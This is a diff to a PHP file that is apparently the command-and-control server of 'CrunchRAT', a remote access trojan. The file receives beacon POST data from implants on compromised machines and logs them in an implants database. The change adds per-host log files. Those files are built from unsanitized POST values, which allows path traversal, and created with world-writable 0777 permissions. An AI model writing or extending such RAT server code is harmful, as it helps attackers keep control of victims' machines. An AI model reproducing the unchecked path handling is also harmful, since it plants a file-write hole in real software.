@@ -1,6 +1,6 @@
 <?php
     include "connector.php";
-
+    
     # TO DO: Add in checks for POST data, reject all requests that don't have the proper POST parameters
 
     # JSON decodes implant POST data
@@ -12,6 +12,21 @@
 
     # Gets current time in UTC (will be used for updating "Last Seen")
     $current_time = gmdate("Y-m-d H:i:s");
+
+    # Creates beacon log file path (based on POST hostname and process ID)
+    $beacon_log_file = "/var/log/CrunchRAT/" . $hostname . "/" . $process_id . ".log";
+
+    # If directory does not exist
+    # Creates new directory
+    if(!file_exists(dirname($beacon_log_file))) {
+        mkdir(dirname($beacon_log_file), 0777, true);
+        touch($beacon_log_file);
+    }
+    # Else directory already exists
+    # Creates a new beacon log file
+    else {
+        touch($beacon_log_file);
+    }
 
     # SQL statement to determine if this is a new or old beaconing host
     $statement = $database_connection->prepare("SELECT * FROM `implants` WHERE `hostname` = :hostname AND `process_id` = :process_id");
